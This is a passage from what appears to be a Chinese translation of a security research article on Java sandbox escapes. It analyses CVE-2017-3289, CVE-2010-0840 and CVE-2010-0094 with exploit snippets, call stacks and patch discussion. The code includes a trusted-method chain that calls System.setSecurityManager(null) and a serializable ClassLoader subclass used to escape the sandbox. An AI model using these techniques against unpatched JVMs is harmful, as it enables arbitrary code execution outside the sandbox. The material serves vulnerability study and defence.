实例化<em>MBeanInstantiator</em>的替代代码利用了CVE-2017-3289的漏洞：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PoCMBeanInstantiator</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">Object</span> </span>&#123;</span><br><span class="line"><span class="number">2</span>:   <span class="function"><span class="keyword">public</span> <span class="title">PoCMBeanInstantiator</span><span class="params">(ModifiableClassLoaderRepository clr)</span> </span>&#123;</span><br><span class="line"><span class="number">3</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException();</span><br><span class="line"><span class="number">4</span>:   &#125;</span><br><span class="line"><span class="number">5</span>:</span><br><span class="line"><span class="number">6</span>:   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">get</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">7</span>:     <span class="keyword">return</span> <span class="keyword">new</span> PoCMBeanInstantiator(<span class="keyword">null</span>);</span><br><span class="line"><span class="number">8</span>:   &#125;</span><br><span class="line"><span class="number">9</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　请注意，由于<em>MBeanInstantiator</em>没有任何公共构造函数，<em>PoCMBeanInstantiator</em>必须在源代码中扩展一个虚拟类，在我们的示例中为<em>java.lang.Object</em>。我们使用ASM字节码操作库，将<em>PoCMBeanInstantiator</em>的超类更改为<em>MBeanInstantiator</em>。我们还使用ASM来更改构造函数的字节码以绕过对super。<init>（*）的调用。<br>　　自Java 1.7.0更新13以来，Oracle已将<em>com.sun.jmx.</em>添加为受限程序包。类<em>MBeanInstantiator</em>在此包中，因此无法在更高版本的Java中重用此帮助程序代码。<br>　　令我们惊讶的是，此漏洞影响了40多个不同的公开发布。从更新0到更新80的所有Java 7版本都会受到影响。从更新5到更新112的所有Java 8版本也会受到影响。Java 6不受影响。<br>　　通过查看Java 6更新43的字节码验证器和Java 7更新0的源代码之间的差异，我们注意到diff的主要部分对应于上面提供的补丁的逆。这意味着在构造函数中异常处理程序中堆栈帧可分配给目标堆栈帧的条件已被削弱。diff中的注释表明这个新代码已经通过请求7020118添加。此请求要求更新字节码验证程序的代码，以便NetBeans的分析器可以生成处理程序以覆盖构造函数的整个代码。<br>　　通过收紧约束来修复漏洞，在该约束下，当前堆栈帧（在try / catch块中的构造函数中）可以分配给目标堆栈帧。这有效地防止字节码从构造函数返回未初始化的“this”对象。<br>　　据我们所知，Java至少有三个公开的<em>uninitialized instance</em>漏洞。一个是本文中描述的CVE-2017-3289。第二个是在2002年发现的。作者还利用了字节码验证器中的漏洞，该漏洞使得不能调用超类的构造函数。他们无法开发漏洞来完全逃离沙箱。但是，他们能够访问网络并将文件读写到磁盘。第三个是1996年普林斯顿的一个研究小组发现的。同样，问题出在字节码验证器中。它允许构造函数捕获对super（）的调用抛出的异常并返回部分初始化的对象。请注意，在此次攻击时，类加载器类没有任何实例变量。因此，利用漏洞来实例化类加载器给出了一个完全初始化的类加载器，可以在其上调用任何方法。</init></p><h5 id="4-2-3-讨论"><a href="#4-2-3-讨论" class="headerlink" title="4.2.3 讨论"></a>4.2.3 讨论</h5><p>　　此漏洞的根本原因是对C / C ++字节码验证代码的修改，该代码使分析人员能够创建Java字节码，该字节码无法绕过对子类构造函数中的super（）的调用。此漏洞直接违反了虚拟机的规范。<br>　　但是，如果没有适当的<em>helper</em>代码，此漏洞将毫无用处。Oracle开发了静态分析工具来查找危险的小工具并将其列入黑名单。这使得分析师更难以绕过沙箱开发漏洞利用程序。实际上，我们只发现了与旧版JVM一起使用的有趣小工具。由于它们已被列入最新版本的黑名单，因此攻击不再起作用。然而，即使该方法依赖于静态分析，它（1）可能会产生许多误报，这使得识别真正危险的小工具变得更加困难，并且（2）可能具有错误的否定因为它不能真实地模拟语言的所有特定性，通常反射和JNI，因此不健全。</p><h4 id="4-3-可信方法链"><a href="#4-3-可信方法链" class="headerlink" title="4.3 可信方法链"></a>4.3 可信方法链</h4><h5 id="4-3-1-背景"><a href="#4-3-1-背景" class="headerlink" title="4.3.1 背景"></a>4.3.1 背景</h5><p>　　每当在Java中执行安全检查时，都会检查整个调用堆栈。调用堆栈的每个帧都包含由其类和方法签名标识的方法名称。可信方法链攻击的想法是在调用堆栈上只有受信任的类。为实现此目的，分析人员通常依赖于受信任类中存在的反射功能来调用目标方法。这样，当安全检查完成并且目标方法将在特权上下文中执行时（通常禁用安全管理器），调用堆栈上不会有应用程序类（不可信）。为了使这种方法起作用，方法链必须位于特权线程上，例如事件线程。它不能在主线程上工作，因为具有main方法的类被认为是不可信的，因此安全检查将引发异常。</p><h5 id="4-3-2-示例：CVE-2010-0840"><a href="#4-3-2-示例：CVE-2010-0840" class="headerlink" title="4.3.2 示例：CVE-2010-0840"></a>4.3.2 示例：CVE-2010-0840</h5><p>　　此漏洞是针对Java平台的可信方法链攻击的第一个示例。它依赖于<em>java.beans.Statement</em>类来通过反射执行目标方法。该漏洞利用了一个<em>JList</em> GUI元素（“一个显示对象列表并允许用户选择一个或多个项目的组件。”）强制GUI线程绘制新元素。漏洞利用代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// target method</span></span><br><span class="line">   Object target = System.class;</span><br><span class="line">   String methodName = <span class="string">"setSecurityManager"</span>;</span><br><span class="line">   Object[] args = <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span> &#125;;</span><br><span class="line"></span><br><span class="line">   Link l = <span class="keyword">new</span> Link(target, methodName, args);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">final</span> HashSet s = <span class="keyword">new</span> HashSet();</span><br><span class="line">   s.add(l);</span><br><span class="line"></span><br><span class="line">   Map h = <span class="keyword">new</span> HashMap() &#123;</span><br><span class="line">   	<span class="function"><span class="keyword">public</span> Set <span class="title">entrySet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   		<span class="keyword">return</span> s;</span><br><span class="line">   	&#125;; &#125;;</span><br><span class="line"></span><br><span class="line">   sList = <span class="keyword">new</span> JList(<span class="keyword">new</span> Object[] &#123; h &#125;);</span><br></pre></td></tr></table></figure><p>　　目标方法通过<em>Link</em>对象表示为<em>Statement</em>。<em>Link</em>类不是来自JCL的类，而是由分析师构造的类。<em>Link</em>类是<em>Expression</em>的子类，它是<em>Statement</em>的子类。<em>Link</em>对象也以伪方式实现<em>java.util.Map.Entry</em>接口的getValue（）方法。它不是<em>Entry</em>接口的真正实现，因为只存在getValue（）方法。这种“实现”不能用普通的javac编译器完成，必须通过直接修改<em>Link</em>类的字节码来完成。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">   [...]</span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Returns the value corresponding to this entry.  If the mapping</span></span><br><span class="line"><span class="comment">   * has been removed from the backing map (by the iterator's</span></span><br><span class="line"><span class="comment">   * &lt;tt&gt;remove&lt;/tt&gt; operation), the results of this call are</span></span><br><span class="line"><span class="comment">   * undefined.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> the value corresponding to this entry</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@throws</span> IllegalStateException implementations may, but are not</span></span><br><span class="line"><span class="comment">   *         required to, throw this exception if the entry has been</span></span><br><span class="line"><span class="comment">   *         removed from the backing map.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   <span class="function">V <span class="title">getValue</span><span class="params">()</span></span>;</span><br><span class="line">   [...]</span><br></pre></td></tr></table></figure><p>　　该接口具有getValue（）方法。事实证明<em>Expression</em>类也有一个具有相同签名的getValue（）方法。这就是为什么在运行时在<em>Link</em>类型的对象上调用Entry.getValue（），伪造<em>Entry</em>的实现，可以成功。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// in AbstractMap</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">   <span class="keyword">if</span> (! i.hasNext())</span><br><span class="line">           <span class="keyword">return</span> <span class="string">"&#123;&#125;"</span>;</span><br><span class="line"></span><br><span class="line">   StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">   sb.append(<span class="string">'&#123;'</span>);</span><br><span class="line">   <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">     	   Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">     	   K key = e.getKey();</span><br><span class="line">     	   V value = e.getValue();</span><br><span class="line">     	   sb.append(key   == <span class="keyword">this</span> ? <span class="string">"(this Map)"</span> : key);</span><br><span class="line">     	   sb.append(<span class="string">'='</span>);</span><br><span class="line">     	   sb.append(value == <span class="keyword">this</span> ? <span class="string">"(this Map)"</span> : value);</span><br><span class="line">     	   <span class="keyword">if</span> (! i.hasNext())</span><br><span class="line">     		   <span class="keyword">return</span> sb.append(<span class="string">'&#125;'</span>).toString();</span><br><span class="line">     	   sb.append(<span class="string">','</span>).append(<span class="string">' '</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　分析师的目的是调用AbstractMap.toString（）方法来调用<em>Link</em>对象上的Entry.getValue（），该对象调用invoke（）方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (value == unbound) &#123;</span><br><span class="line">     	   setValue(invoke());</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　invoke方法通过反射执行分析师的目标方法System.setSecurityManapger（null）以禁用安全管理器。通过反射调用此方法时的调用堆栈如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">at java.beans.Statement.invoke(Statement.java:<span class="number">235</span>)</span><br><span class="line">at java.beans.Expression.getValue(Expression.java:<span class="number">98</span>)</span><br><span class="line">at java.util.AbstractMap.toString(AbstractMap.java:<span class="number">487</span>)</span><br><span class="line">at javax.swing.DefaultListCellRenderer.getListCellRendererComponent</span><br><span class="line">	(DefaultListCellRenderer.java:<span class="number">125</span>)</span><br><span class="line">at javax.swing.plaf.basic.BasicListUI.updateLayoutState</span><br><span class="line">	(BasicListUI.java:<span class="number">1337</span>)</span><br><span class="line">at javax.swing.plaf.basic.BasicListUI.maybeUpdateLayoutState</span><br><span class="line">	(BasicListUI.java:<span class="number">1287</span>)</span><br><span class="line">at javax.swing.plaf.basic.BasicListUI.paintImpl(BasicListUI.java:<span class="number">251</span>)</span><br><span class="line">at javax.swing.plaf.basic.BasicListUI.paint(BasicListUI.java:<span class="number">227</span>)</span><br><span class="line">at javax.swing.plaf.ComponentUI.update(ComponentUI.java:<span class="number">143</span>)</span><br><span class="line">at javax.swing.JComponent.paintComponent(JComponent.java:<span class="number">758</span>)</span><br><span class="line">at javax.swing.JComponent.paint(JComponent.java:<span class="number">1022</span>)</span><br><span class="line">at javax.swing.JComponent.paintChildren(JComponent.java:<span class="number">859</span>)</span><br><span class="line">at javax.swing.JComponent.paint(JComponent.java:<span class="number">1031</span>)</span><br><span class="line">at javax.swing.JComponent.paintChildren(JComponent.java:<span class="number">859</span>)</span><br><span class="line">at javax.swing.JComponent.paint(JComponent.java:<span class="number">1031</span>)</span><br><span class="line">at javax.swing.JLayeredPane.paint(JLayeredPane.java:<span class="number">564</span>)</span><br><span class="line">at javax.swing.JComponent.paintChildren(JComponent.java:<span class="number">859</span>)</span><br><span class="line">at javax.swing.JComponent.paint(JComponent.java:<span class="number">1031</span>)</span><br><span class="line">at javax.swing.JComponent.paintToOffscreen(JComponent.java:<span class="number">5104</span>)</span><br><span class="line">at javax.swing.BufferStrategyPaintManager.paint</span><br><span class="line">	(BufferStrategyPaintManager.java:<span class="number">285</span>)</span><br><span class="line">at javax.swing.RepaintManager.paint(RepaintManager.java:<span class="number">1128</span>)</span><br><span class="line">at javax.swing.JComponent._paintImmediately(JComponent.java:<span class="number">5052</span>)</span><br><span class="line">at javax.swing.JComponent.paintImmediately(JComponent.java:<span class="number">4862</span>)</span><br><span class="line">at javax.swing.RepaintManager.paintDirtyRegions</span><br><span class="line">	(RepaintManager.java:<span class="number">723</span>)</span><br><span class="line">at javax.swing.RepaintManager.paintDirtyRegions</span><br><span class="line">	(RepaintManager.java:<span class="number">679</span>)</span><br><span class="line">at javax.swing.RepaintManager.seqPaintDirtyRegions</span><br><span class="line">	(RepaintManager.java:<span class="number">659</span>)</span><br><span class="line">at javax.swing.SystemEventQueueUtilities$ComponentWorkRequest.run</span><br><span class="line">	(SystemEventQueueUtilities.java:<span class="number">128</span>)</span><br><span class="line">at java.awt.event.InvocationEvent.dispatch(InvocationEvent.java:<span class="number">209</span>)</span><br><span class="line">at java.awt.EventQueue.dispatchEvent(EventQueue.java:<span class="number">597</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpOneEventForFilters</span><br><span class="line">	(EventDispatchThread.java:<span class="number">273</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpEventsForFilter</span><br><span class="line">	(EventDispatchThread.java:<span class="number">183</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpEventsForHierarchy</span><br><span class="line">	(EventDispatchThread.java:<span class="number">173</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpEvents</span><br><span class="line">	(EventDispatchThread.java:<span class="number">168</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpEvents</span><br><span class="line">	(EventDispatchThread.java:<span class="number">160</span>)</span><br><span class="line">at java.awt.EventDispatchThread.run(EventDispatchThread.java:<span class="number">121</span>)</span><br></pre></td></tr></table></figure><p>　　第一个观察是调用堆栈上没有不受信任的类。对调用堆栈的元素执行的任何安全检查都将通过。<br>　　如上面的调用堆栈所示，绘制操作（RepaintManager.java:1128）最终调用getListCellRendererComponent（）方法（DefaultListCellRenderer.java:125）。<em>JList</em>构造函数将item元素的列表作为参数。此方法依次调用项目上的toString（）方法。第一个元素是<em>Map</em>，在其所有项目上调用getValue（）。getValue（）方法调用Statement.invoke（），它通过反射调用分析师的目标方法。</p><h5 id="4-3-3-讨论"><a href="#4-3-3-讨论" class="headerlink" title="4.3.3 讨论"></a>4.3.3 讨论</h5><p>　　通过修改Statement.invoke（）方法来修补此漏洞，以在创建<em>Statement</em>的代码的<em>AccessControlContext</em>中执行反射调用。此漏洞不适用于最新版本的JRE，因为创建<em>Statement</em>的不受信任的代码没有任何权限。</p><h4 id="4-4-序列化"><a href="#4-4-序列化" class="headerlink" title="4.4 序列化"></a>4.4 序列化</h4><h5 id="4-4-1-背景"><a href="#4-4-1-背景" class="headerlink" title="4.4.1 背景"></a>4.4.1 背景</h5><p>　　Java允许在运行时将对象转换为字节流，这对于持久性和网络通信非常有用。将对象转换为字节序列称为串行，并且将字节流转换为对象的相反过程称为反序列化。在特权上下文中完成反序列化过程的一部分可能会发生。分析人员可以通过实例化由于缺少权限而通常不允许实例化的对象来利用这一点。一个典型的例子是类<em>java.lang.ClassLoader</em>。分析人员（总是在没有权限的情况下）不能直接实例化<em>ClassLoader</em>的子类_S_，因为<em>ClassLoader</em>的构造函数检查调用者是否具有CREATE_CLASSLOADER权限。但是，如果他找到了在特权上下文中反序列化_S_的序列化版本的方法，他可能最终会得到_S_的实例。请注意，_S_的序列化版本可以由攻击范围之外的分析人员创建（例如，在他自己的机器上，没有沙箱的JVM）。在攻击期间，序列化版本只是表示_S_实例的数据。在本节中，我们将展示如何利用CVE-2010-0094来使用系统代码，该系统代码对特权上下文中分析师提供的数据进行反序列化。这可用于执行任意代码，从而绕过所有沙箱限制。</p><h5 id="4-4-2-示例：CVE-2010-0094"><a href="#4-4-2-示例：CVE-2010-0094" class="headerlink" title="4.4.2 示例：CVE-2010-0094"></a>4.4.2 示例：CVE-2010-0094</h5><p>　　漏洞CVE-2010-0094位于方法RMIConnectionImpl.createMBean（String，ObjectName，ObjectName，MarshalledObject，String[]，Subject）中。<em>MarshalledObject</em>类型的第四个参数包含对象_S_的字节表示，该对象在特权上下文中进行反序列化（在具有所有权限的doPrivileged（）调用内）。分析人员可以传递任意对象来创建用于反序列化的MBean（）。在我们的例子中，他传递了<em>java.lang.ClassLoader</em>的子类：<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>　　在易受攻击的JVM版本（例如1.6.0_17）中，实例化对象_S_时的调用堆栈如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: Thread [main] (Suspended (breakpoint at line <span class="number">226</span> in ClassLoader))</span><br><span class="line"> <span class="number">2</span>: 	S(ClassLoader).&lt;init&gt;() line: <span class="number">226</span> [local variables</span><br><span class="line">    		unavailable]</span><br><span class="line"> <span class="number">4</span>: 	GeneratedSerializationConstructorAccessor1.newInstance(Object[])</span><br><span class="line">    		line: not available</span><br><span class="line"> <span class="number">6</span>: 	Constructor&lt;T&gt;.newInstance(Object...) line: <span class="number">513</span></span><br><span class="line"> <span class="number">7</span>: 	ObjectStreamClass.newInstance() line: <span class="number">924</span></span><br><span class="line"> <span class="number">8</span>: 	MarshalledObject$MarshalledObjectInputStream</span><br><span class="line">    		(ObjectInputStream).readOrdinaryObject(<span class="keyword">boolean</span>) line: <span class="number">1737</span></span><br><span class="line"><span class="number">10</span>: 	MarshalledObject$MarshalledObjectInputStream</span><br><span class="line">    		(ObjectInputStream).readObject0(<span class="keyword">boolean</span>) line: <span class="number">1329</span></span><br><span class="line"><span class="number">12</span>: 	MarshalledObject$MarshalledObjectInputStream</span><br><span class="line">    		(ObjectInputStream).readObject() line: <span class="number">351</span></span><br><span class="line"><span class="number">14</span>: 	MarshalledObject&lt;T&gt;.get() line: <span class="number">142</span></span><br><span class="line"><span class="number">15</span>: 	RMIConnectionImpl$<span class="number">6</span>.run() line: <span class="number">1513</span></span><br><span class="line"><span class="number">16</span>: 	AccessController.doPrivileged(PrivilegedExceptionAction&lt;T&gt;)</span><br><span class="line">    		line: not available [<span class="keyword">native</span> method]</span><br><span class="line"><span class="number">18</span>: 	RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader,</span><br><span class="line">    		Class&lt;T&gt;) line: <span class="number">1505</span></span><br><span class="line"><span class="number">20</span>: 	RMIConnectionImpl.access$<span class="number">500</span>(MarshalledObject, ClassLoader,</span><br><span class="line">    		Class) line: <span class="number">72</span></span><br><span class="line"><span class="number">22</span>: 	RMIConnectionImpl$<span class="number">7</span>.run() line: <span class="number">1548</span></span><br><span class="line"><span class="number">23</span>: 	AccessController.doPrivileged(PrivilegedExceptionAction&lt;T&gt;)</span><br><span class="line">    		line: not available [<span class="keyword">native</span> method]</span><br><span class="line"><span class="number">25</span>: 	RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader,</span><br><span class="line">    		ClassLoader, Class&lt;T&gt;) line: <span class="number">1544</span></span><br><span class="line"><span class="number">27</span>: 	RMIConnectionImpl.createMBean(String, ObjectName, ObjectName,</span><br><span class="line">    		MarshalledObject, String[], Subject) line: <span class="number">376</span></span><br><span class="line"><span class="number">29</span>: 	Exploit.exploit() line: <span class="number">79</span></span><br><span class="line"><span class="number">30</span>: 	Exploit(BypassExploit).run_exploit() line: <span class="number">24</span></span><br><span class="line"><span class="number">31</span>: 	ExploitBase.run(ExploitBase) line: <span class="number">20</span></span><br><span class="line"><span class="number">32</span>: 	Exploit.main(String[]) line: <span class="number">19</span></span><br></pre></td></tr></table></figure><p>　　我们观察到反序列化发生在特权上下文中（在第16行和第23行的doPrivileged（）内）。请注意，它是<em>ClassLoader</em>类（<init>（），可信代码）的构造函数，它位于堆栈上，而不是_S_（分析器类，不可信代码）的构造函数。请注意，在第2行“S（ClassLoader）”表示<em>ClassLoader</em>在堆栈上，而不是_S_。如果_S_已经在堆栈上，<em>ClassLoader</em>构造函数中的权限检查会抛出安全异常，因为不受信任的代码（因此没有权限）在堆栈上。为什么_S_不在调用堆栈上？答案由序列化协议的文档给出。它表示被调用的构造函数是没有实现<em>Serializable</em>接口的类层次结构的第一个构造函数。在我们的示例中，_S_实现<em>Serializable</em>，因此不会调用其构造函数。_S_扩展<em>ClassLoader</em>，它不实现<em>Serializable</em>。因此，反序列化系统代码调用<em>ClassLoader</em>的空构造函数。因此，堆栈跟踪仅在特权上下文中包含堆栈上的受信任系统类（在doPrivileged（）之后可能存在不受信任的代码，因为在检查调用堆栈时，权限检查将在doPrivileged（）方法处停止）。<em>ClassLoader</em>中的权限检查将成功。<br>　　但是，稍后在系统代码中，_S_的这个实例被强制转换为_S_的类型，而不是<em>ClassLoader</em>。那么，分析师如何检索这个实例呢？一种解决方案是向_S_添加静态字段以及向_S_类添加方法以在静态字段中保存_S_实例的引用：</init></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> S myCL = <span class="keyword">null</span>;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">	  <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"> 		S.myCL = <span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　readObject（）方法是在反序列化期间调用的特殊方法（通过上面调用堆栈中第8行的readOrdinaryObject（））。此时没有进行权限检查，因此不受信任的代码（S.readObject（）方法）可以在调用堆栈上。<br>　　分析师现在可以访问_S_的实例。由于_S_是<em>ClassLoader</em>的子类，因此分析人员可以定义具有所有权限的新类并禁用安全管理器（类似于3.1.1节中的方法）。此时，沙箱被禁用，分析师可以执行任意代码。<br>　　此漏洞影响14个Java 1.6版本（从版本1.6.0_01到1.6.0_18）。它已在版本1.6.0_24中得到纠正。<br>　　以下“功能”的组合使分析师能够绕过沙箱：（1）可信代码允许对不可信代码控制的数据进行反序列化，（2）在特权上下文中进行反序列化，以及（3）通过以下方式创建对象：反序列化的方法遵循与常规对象实例化不同的过程。<br>　　漏洞CVE-2010-0094已在Java 1.6.0更新24中得到修复。对doPrivileged（）的两次调用已从代码中删除。在修补版本中，当初始化<em>ClassLoader</em>时，权限检查失败，因为现在检查整个调用堆栈（请参阅下面的新调用堆栈）。第21行及以下的不受信任的代码没有CREATE_CLASSLOADER权限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: Thread [main] (Suspended (breakpoint at line <span class="number">226</span> in ClassLoader))</span><br><span class="line"> <span class="number">2</span>: 	MyClassLoader(ClassLoader).&lt;init&gt;() line: <span class="number">226</span> [local variables</span><br><span class="line">    		unavailable]</span><br><span class="line"> <span class="number">4</span>: 	GeneratedSerializationConstructorAccessor1.newInstance(Object[])</span><br><span class="line">    		line: not available</span><br><span class="line"> <span class="number">6</span>: 	Constructor&lt;T&gt;.newInstance(Object...) line: <span class="number">513</span></span><br><span class="line"> <span class="number">7</span>: 	ObjectStreamClass.newInstance() line: <span class="number">924</span></span><br><span class="line"> <span class="number">8</span>: 	MarshalledObject$MarshalledObjectInputStream</span><br><span class="line">    		(ObjectInputStream).readOrdinaryObject(<span class="keyword">boolean</span>) line: <span class="number">1736</span></span><br><span class="line"><span class="number">10</span>: 	MarshalledObject$MarshalledObjectInputStream(ObjectInputStream)</span><br><span class="line">    		.readObject0(<span class="keyword">boolean</span>) line: <span class="number">1328</span></span><br><span class="line"><span class="number">12</span>: 	MarshalledObject$MarshalledObjectInputStream(ObjectInputStream)</span><br><span class="line">    		.readObject() line: <span class="number">350</span></span><br><span class="line"><span class="number">14</span>: 	MarshalledObject&lt;T&gt;.get() line: <span class="number">142</span></span><br><span class="line"><span class="number">15</span>: 	RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader,</span><br><span class="line">    		Class&lt;T&gt;) line: <span class="number">1523</span></span><br><span class="line"><span class="number">17</span>: 	RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader,</span><br><span class="line">    		ClassLoader, Class&lt;T&gt;) line: <span class="number">1559</span></span><br><span class="line"><span class="number">19</span>: 	RMIConnectionImpl.createMBean(String, ObjectName, ObjectName,</span><br><span class="line">    		MarshalledObject, String[], Subject) line: <span class="number">376</span></span><br><span class="line"><span class="number">21</span>: 	Exploit.exploit() line: <span class="number">79</span></span><br><span class="line"><span class="number">22</span>: 	Exploit(BypassExploit).run_exploit() line: <span class="number">24</span></span><br><span class="line"><span class="number">23</span>: 	ExploitBase.run(ExploitBase) line: <span class="number">20</span></span><br><span class="line"><span class="number">24</span>: 	Exploit.main(String[]) line: <span class="number">19</span></span><br></pre></td></tr></table></figure><h5 